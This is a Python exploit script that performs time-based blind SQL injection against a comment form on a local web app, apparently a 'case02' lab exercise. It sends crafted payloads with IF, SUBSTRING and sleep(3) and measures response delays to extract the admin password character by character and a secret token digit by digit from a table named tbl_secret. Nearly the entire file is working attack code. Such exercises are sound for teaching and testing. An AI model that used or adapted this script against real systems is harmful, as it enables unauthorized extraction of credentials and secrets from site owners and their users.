#!/usr/bin/env python3
# author: dhavalk

import requests
import time


def do_request(comment):
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://localhost:5000',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 '
                      'Safari/537.36',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Referer': 'http://localhost:5000/case02',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    data = {
        'comment': comment
    }
    response = requests.post('http://localhost:5000/case02', headers=headers, data=data)


def leak_password():
    payload = f"blah', (IF((ASCII(SUBSTRING((SELECT password from tbl_secret WHERE user = 'admin'), %d, 1)) = %d), " \
              "sleep(3), 0)), 0, 'anonymous')# "

    leaked_password = ""
    while True:
        found = False
        should_end = False
        for i in range(0, 128):
            n_payload = payload % (len(leaked_password) + 1, i)
            t1 = time.time()
            do_request(n_payload)
            t2 = time.time()
            if (t2 - t1) > 2:
                if i == 0:
                    should_end = True
                    break
                leaked_password += str(chr(i))
                print("Leaked password: %s" % leaked_password)
                found = True
                break
        if should_end:
            break
        if not found:
            print("password not found")
            exit(0)
    print(f"password has been leaked \n")


def leak_token():
    payload = f"blah', (IF((FLOOR((((SELECT token from tbl_secret WHERE user = 'admin') / %d) %% 10)) = %d), " \
              f"sleep(3), " \
              "0)), 0, 'anonymous')# "

    leaked_token = 0
    current_power = 0
    while current_power <= 10:
        found = False
        for i in range(0, 10):
            n_payload = payload % (10 ** current_power, i)
            t1 = time.time()
            do_request(n_payload)
            t2 = time.time()
            if (t2 - t1) > 2:
                leaked_token += 10 ** current_power * i
                current_power += 1
                print("Leaked token: %s" % leaked_token)
                found = True
                break
        if not found:
            print("token not found")
            exit(0)
    print(f"token has been leaked \n")


def main():
    leak_password()
    leak_token()


if __name__ == "__main__":
    main()
